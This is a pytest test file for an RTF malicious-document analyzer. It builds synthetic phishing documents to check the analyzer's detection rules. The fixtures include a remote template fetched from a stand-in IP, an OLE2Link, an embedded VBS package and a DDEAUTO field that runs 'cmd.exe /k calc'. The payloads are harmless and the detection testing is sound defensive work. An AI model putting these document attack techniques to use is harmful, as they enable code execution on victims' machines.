"""RTF block: identification by content, structure/object/field rules, attribution, recursion."""

from __future__ import annotations

import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

import rtfkit as rk  # noqa: E402

from docutracex import identify, ioc, nested, structure  # noqa: E402
from docutracex.analyze import _family  # noqa: E402
from docutracex.parsers import rtf  # noqa: E402


def _rules(res):
    return {f["rule"] for f in res["findings"]}


def _write(tmp_path: Path, name: str, data: bytes) -> Path:
    p = tmp_path / name
    p.write_bytes(data)
    return p


@pytest.fixture()
def maldoc(tmp_path: Path) -> Path:
    return _write(tmp_path, "pedido.doc", rk.build_rtf(
        ["Estimado cliente:", "Adjuntamos el pedido PO-2026-0412. Active la edición para verlo."],
        title="Pedido", author="Compras", operator="C:\\Users\\jmartin\\Documents",
        template="http://198.51.100.7/plantillas/normal.dotm",
        body_extra=[rk.equation(junk=" {\\*\\xx} "), rk.ole2link("http://203.0.113.5/doc/pedido.rtf"),
                    rk.package("pedido.vbs", b'MsgBox "documentation sample"'),
                    rk.field('INCLUDEPICTURE "http://img.example.net/logo.png" \\d', "logo"),
                    rk.field('HYPERLINK "https://portal.example.com/pedidos"', "Portal"),
                    rk.pfragments_shape()],
        trailer=b"\r\n" + b"A" * 64))


def test_rtf_is_recognised_by_content() -> None:
    assert rtf.is_rtf(b"{\\rtf1\\ansi") and rtf.is_rtf(b"{\\rtvpn") and not rtf.is_rtf(b"PK\x03\x04")
    assert identify.detected_family("text/rtf", "Rich Text Format data") == "rtf"


def test_doc_that_is_rtf_is_analysed_as_rtf(maldoc: Path) -> None:
    rec = structure.recognize(maldoc, ".doc")
    assert rec and rec["family"] == "rtf"
    assert identify.classify_discrepancy(".doc", "text/rtf", "Rich Text Format data", "rtf")["status"] == "mismatch"
    assert _family({"format": {"discrepancy": {"declared_family": "ole"}}}, maldoc) == "rtf"
    assert nested._kind(maldoc, "pedido.doc") == "rtf"


def test_object_structure_and_field_rules(maldoc: Path, tmp_path: Path) -> None:
    res = rtf.analyze(maldoc, ".doc", tmp_path / "extracted")
    assert {"rtf_disguised_extension", "equation_editor", "ole2link", "objupdate_autoload", "package_object",
            "remote_template", "remote_field_resource", "pfragments_shape", "objdata_obfuscated",
            "data_after_rtf_end", "author_local_path"} <= _rules(res)
    o2l = next(f for f in res["findings"] if f["rule"] == "ole2link")
    assert o2l["evidence"] == "http://203.0.113.5/doc/pedido.rtf"
    pkg = next(f for f in res["findings"] if f["rule"] == "package_object")
    assert pkg["severity"] == "high" and "pedido.vbs" in pkg["detail"]
    assert [o["class_name"] for o in res["objects"]] == ["Equation.3", "OLE2Link", "Package"]
    assert all((tmp_path / o["stored_path"]).is_file() for o in res["objects"])
    assert res["attribution"]["author"] == "Compras" and res["attribution"]["creatim"] == "2026-10-09 08:41"
    assert res["attribution"]["rsid_count"] == 3
    assert "PO-2026-0412" in res["text"] and "AAAA" not in res["text"]
    assert [f["instr"].split()[0] for f in res["fields"]] == ["INCLUDEPICTURE", "HYPERLINK"]


def test_iocs_come_from_text_fields_template_and_links(maldoc: Path, tmp_path: Path) -> None:
    res = rtf.analyze(maldoc, ".doc", tmp_path / "extracted")
    values = {i["value"] for i in ioc.extract(ioc.sources_from_modules({"rtf": res}))["iocs"]}
    assert {"http://198.51.100.7/plantillas/normal.dotm", "http://203.0.113.5/doc/pedido.rtf",
            "http://img.example.net/logo.png", "https://portal.example.com/pedidos"} <= values


def test_exploit_shapes(tmp_path: Path) -> None:
    data = rk.build_rtf(["x"], header="{\\rtvpn", fonts=32800, nesting=70, body_extra=[
        '{\\*\\docvar {payload}{' + "QUFB" * 100 + '}}',
        '{\\field{\\*\\fldinst DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"}{\\fldrslt x}}'])
    res = rtf.analyze(_write(tmp_path, "a.rtf", data[:-1]), ".rtf", None)
    sev = {f["rule"]: f["severity"] for f in res["findings"]}
    assert sev["font_table_overflow"] == "high" and sev["dde_field"] == "high"
    assert sev["document_variables"] == "high" and sev["deep_nesting"] == "medium"
    assert {"rtf_malformed_header", "unbalanced_braces"} <= set(sev)


def test_clean_letter_has_no_findings(tmp_path: Path) -> None:
    data = rk.build_rtf(["Acta de la reunión del comité", "Asistentes: Ana, Luis y Marta."], author="Ana",
                        body_extra=[rk.field('HYPERLINK "https://www.example.com/actas"', "actas")])
    res = rtf.analyze(_write(tmp_path, "acta.rtf", data), ".rtf", None)
    assert res["findings"] == []
    assert "Acta de la reunión" in res["text"]


def test_case_runs_rtf_branch_and_recurses(maldoc: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from fastapi.testclient import TestClient

    from docutracex.app import create_app
    from docutracex.config import settings

    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    client = TestClient(create_app())
    cid = client.post("/api/cases", files={"file": ("pedido.doc", maldoc.read_bytes())}).json()["analysis_id"]
    for _ in range(600):
        if client.get(f"/api/cases/{cid}").json().get("state") not in ("queued", "running", "received", "created"):
            break
        time.sleep(0.1)
    comp = client.get(f"/api/cases/{cid}/components").json()
    mods = comp["modules"]
    assert "rtf" in mods and "ole" not in mods
    sources = {f["source"] for f in comp["findings"]}
    assert "rtf" in sources
    tree = (mods.get("nested") or {}).get("tree") or []
    assert {n["filename"] for n in tree} >= {"pedido.vbs"}
